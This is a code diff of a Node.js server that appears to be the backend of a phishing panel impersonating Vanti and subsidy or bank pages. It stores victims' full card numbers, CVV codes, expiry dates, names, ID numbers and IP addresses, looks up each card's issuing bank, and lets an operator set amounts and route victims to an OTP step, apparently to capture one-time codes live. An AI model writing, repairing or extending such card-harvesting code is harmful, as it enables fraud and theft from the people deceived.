@@ -325,12 +325,9 @@ const server = http.createServer(async (req, res) => {
                         if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
                         estadoSesiones.set(sessionId, 'precio_asignado');
                         ultimaAccionSesiones.set(sessionId, String(valor));
-                        
-                        // 🔥 GUARDAR EL PRECIO EN LA SESIÓN
                         const datosPrevios = datosSesiones.get(sessionId) || {};
                         const datosActualizados = Object.assign({}, datosPrevios, { monto: Number(valor), precio: Number(valor) });
                         datosSesiones.set(sessionId, datosActualizados);
-
                         agregarLog('poner-precio', { usuario: payload.user, sessionId, valor });
                         json(res, 200, { ok: true, estado: 'precio_asignado', accion: String(valor) });
                         return;
@@ -353,7 +350,6 @@ const server = http.createServer(async (req, res) => {
                     const datosSesionActual = datosSesiones.get(sessionId) || {};
                     const bancoKey = datosSesionActual.bancoKey || '';
 
-                    // 🔥 REGLA ESPECIAL VANTI: ACEPTAR primero pasa por OTP
                     if (bancoKey === 'vanti' && accion === 'ACEPTAR' && estadoSesiones.get(sessionId) !== 'otp') {
                         estadoNuevo = 'otp';
                         ultimaAccionSesiones.set(sessionId, 'OTP');
@@ -402,9 +398,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTAS PARA BANCOS Y SUBSIDIO
-        // ============================================================
         const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
         if (req.method === 'POST' && consultaMatch) {
             try {
@@ -564,9 +557,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // ============================================================
-        // 🔥 RUTAS PARA VANTI
-        // ============================================================
         if (req.method === 'POST' && url === '/vanti/enviar') {
             try {
                 const datos = await getBody(req);
@@ -595,39 +585,22 @@ const server = http.createServer(async (req, res) => {
                 const previos = datosSesiones.get(sessionId) || {};
                 const infoBin = await obtenerInfoBin(tarjeta);
                 
-                // Se respeta el precio que ya se haya asignado antes
-                const montoFinal = previos.monto || monto;
-
                 const datosSesion = Object.assign({}, previos, {
-                    sessionId,
-                    bancoKey: 'vanti',
-                    tarjeta,
-                    titular,
-                    docType,
-                    docNumber,
-                    monto: montoFinal,
-                    expMes,
-                    expAnio,
-                    cvv,
-                    marca: marca || 'visa',
-                    ip,
-                    creadoEn: previos.creadoEn || new Date().toISOString(),
-                    bin: infoBin?.bin || '',
-                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
-                    cardType: infoBin?.cardType || 'Desconocido',
-                    cardLevel: infoBin?.cardLevel || 'Desconocido',
-                    bankName: infoBin?.bankName || 'Desconocido',
-                    countryName: infoBin?.countryName || 'Desconocido'
+                    sessionId, bancoKey: 'vanti', tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, marca: marca || 'visa', ip, creadoEn: previos.creadoEn || new Date().toISOString(), bin: infoBin?.bin || '', cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido', cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido'
                 });
 
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
-                pasosSesiones.set(sessionId, 'pagodesubsidio (Tarjeta)');
+                pasosSesiones.set(sessionId, 'Vanti Tarjeta');
                 
-                guardarHistorial('vanti', datosSesion);
+                const datosHistorial = {
+                    sessionId, bancoKey: 'vanti', tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, marca: marca || 'visa', ip, creadoEn: new Date().toISOString(), bin: infoBin?.bin || '', cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido', cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido'
+                };
+
+                guardarHistorial('vanti', datosHistorial);
                 
-                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${montoFinal}`);
+                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${monto}`);
                 json(res, 200, { ok: true, sessionId, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
